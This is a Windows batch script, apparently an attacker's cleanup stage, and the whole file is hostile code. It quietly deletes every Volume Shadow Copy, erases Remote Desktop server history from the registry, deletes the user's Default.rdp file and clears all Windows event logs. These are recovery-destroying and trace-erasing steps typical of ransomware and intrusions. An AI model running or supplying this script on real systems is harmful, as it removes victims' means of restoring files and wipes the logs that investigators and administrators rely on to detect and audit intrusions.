@echo off

vssadmin.exe Delete Shadows /All /Quiet
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"

cd %userprofile%\documents\
attrib Default.rdp -s -h
del Default.rdp

for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
